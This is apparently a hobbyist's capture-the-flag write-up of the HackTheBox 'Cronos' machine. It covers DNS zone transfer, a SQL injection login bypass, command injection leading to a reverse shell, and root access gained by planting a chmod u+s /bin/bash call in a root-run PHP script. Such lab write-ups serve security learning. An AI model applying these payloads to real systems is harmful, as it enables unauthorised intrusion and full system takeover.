---
title: "Cronos"
date: 2023-06-26T12:51:31+02:00
tags: ["linux","lfi","procmon","artisan"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Cronos.png
description: "This write-up will be about the HackTheBox machine called Cronos. "
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "A linux room that is vulnerable a remote code execution throw url."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Cronos
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Cronos

![Untitled](/HTB/Cronos.png)

## Tools Used

- Nmap
- procmon.sh
- digg
- nslookup

## Port Scanning

Other room, other port scan.

![Untitled](/HTB/nmap-cronos.png)

I found 3 open ports, 53(dns's), 80(web), 22(ssh). Let's focus on the website and the dns.

## Enumeration

The only enumeration I done is dns enumeration, with `nslookup` and `dig axfr cronos.htb @10.10.10.13`

![Untitled](/HTB/nslookup-cronos.png)

![Untitled](/HTB/dig-cronos.png)


## Exploiting

The first thing I did, was putting the dns's in the /etc/hosts and access the website `http://admin.cronos.htb`,
and I saw a login page :)

![Untitled](/HTB/web-cronos.png) 

I tried the first combinations I always do and surprise, I pass it with a simple sql injection `admin'or 1=1-- -`...

The web is so incredible, there are two options, the first consist to send a ping to a ip where you can put
whatever you want, and de second option consist at the same but using traceroute ... 

So I first tried to send mi a ping and receive it with `tcpdump -i tun0 icmp -n` and I received it :). Next step
is to send me a reverse shell:

![Untitled](/HTB/burpsuite-cronos.png)

and listening on my pc

```bash
 nc -nlvp 443
```
![Untitled](/HTB/www-data-cronos.png)

The machine is pawned !!

## TTY Treatment

```bash
 cd /dev/shm
 touch procmon.sh 
 chmod +x procmon.sh
 nano procmon.sh 
```

## Gaining an Initial Foothold

We are in now inside, with a user called **www-data**

- Usual commands I always do:
	
	```bash
	 sudo -l
	 cat /etc/crontab
	 find / -perm -4000 2>/dev/null
	 find / -type -d -writable
	 bash procmon.sh
	 lsb_release -a
	 uname -a
	 id
	 getcap -r / 2>/dev/null
	 ...
	```
Code of procmon.sh:

```bash
 #!/bin/bash

 old_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')

 while true; do
        new_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>]" | grep -vE "procmon|awk|kworker"
        old_process=$new_process
 done

```

Using **procmon.sh** and **find / -type -d -writable** I found that user root
is running **/var/www/larevel/artisan**, which is a program in php, and we have 
write/read permissions. So let's modify them to include this:

```bash
 <?php
	system("chmod u+s /bin/bash");
 ?>
```
Then, I did `bash -p`, and I'm root !!

![Untitled](/HTB/root-cronos.png)


## Lessons Learned

- What insights did you gain from the room?
    
    I learned more about cron tasks, using procmon.sh
    
- Were there any novel tools or techniques employed?
    
    The use of procmon.sh it's not new but I improve my privilege escalation metods I think.
